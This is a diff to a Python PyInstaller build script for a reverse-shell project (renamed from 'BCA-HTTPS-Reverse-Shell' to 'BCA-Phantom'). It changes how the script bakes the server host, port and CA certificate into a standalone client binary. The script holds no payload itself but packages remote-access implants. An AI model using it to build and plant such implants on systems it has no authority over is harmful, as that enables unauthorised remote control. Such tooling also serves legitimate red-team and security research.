@@ -1,23 +1,15 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell
+# https://github.com/EONRaider/BCA-Phantom
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import argparse
-import configparser
 import functools
 import platform
 from pathlib import Path
 from typing import Container
 
 import PyInstaller.__main__
-
-
-def os_sep() -> str:
-    """Gets the path separator for the current operating system.
-    Windows systems use ';' as a separator, whereas macOS/Linux/Unix
-    use ':'."""
-    return ";" if platform.system() == "Windows" else ":"
 
 
 def pyinstaller(func):
@@ -30,42 +22,48 @@ def pyinstaller(func):
     return build_binary
 
 
+def os_sep() -> str:
+    """Gets the path separator for the current operating system.
+    Windows systems use ';' as a separator, whereas macOS/Linux/Unix
+    use ':'."""
+    return ";" if platform.system() == "Windows" else ":"
+
+
 @pyinstaller
 def server(args: argparse.Namespace) -> list[str]:
     """Set-up the arguments required by PyInstaller to build the
     server binary."""
-    cmd = ["server/server.py", "--onefile"]
+    cmd = ["src/server/server.py", "--onefile"]
     if args.server_cert is not None:
         cmd.extend(["--add-data", f"{args.server_cert}{os_sep()}."])
     return cmd
 
 
 @pyinstaller
-def client(args: argparse.Namespace) -> list[str]:
+def client(args: argparse.Namespace) -> tuple:
     """Set-up the arguments required by PyInstaller to build the
     client binary."""
 
-    '''A configuration file named 'client.cfg' is created with 
-    hard-coded server address, port and CA information that allows 
-    seamless connection of the binary client to the server. This file 
-    is bundled in the binary and read on execution.'''
-    config = configparser.ConfigParser()
-    config["CLIENT"] = {
+    config = {
         "host": args.host,
-        "port": str(args.port),
-        "ca-certificate": Path(args.ca_cert).name
+        "port": args.port,
+        "ca_cert": Path(args.ca_cert).name
     }
 
-    with open(file="client.cfg", mode="w") as config_file:
-        config.write(config_file)
+    '''A configuration file named 'client.py' is created with hardcoded 
+    server address, port and path to CA certificate file that allows 
+    seamless connection of the binary client to the server. This file 
+    is bundled in the binary and read on execution.'''
+    with open(file="src/client/config.py", mode="w") as config_file:
+        for key, value in config.items():
+            config_file.write(f"{key} = '{value}'\n")
 
-    sep = os_sep()
-    cmd = ["client/client.py",
-           "--onefile",
-           "--add-data", f"{args.ca_cert}{sep}.",
-           "--add-data", f"client.cfg{sep}."]
-
-    return cmd
+    return (
+        "src/client/client.py",
+        "--onefile",
+        "--add-data", f"{args.ca_cert}{os_sep()}.",
+        "--hidden-import", "config"
+    )
 
 
 if __name__ == "__main__":
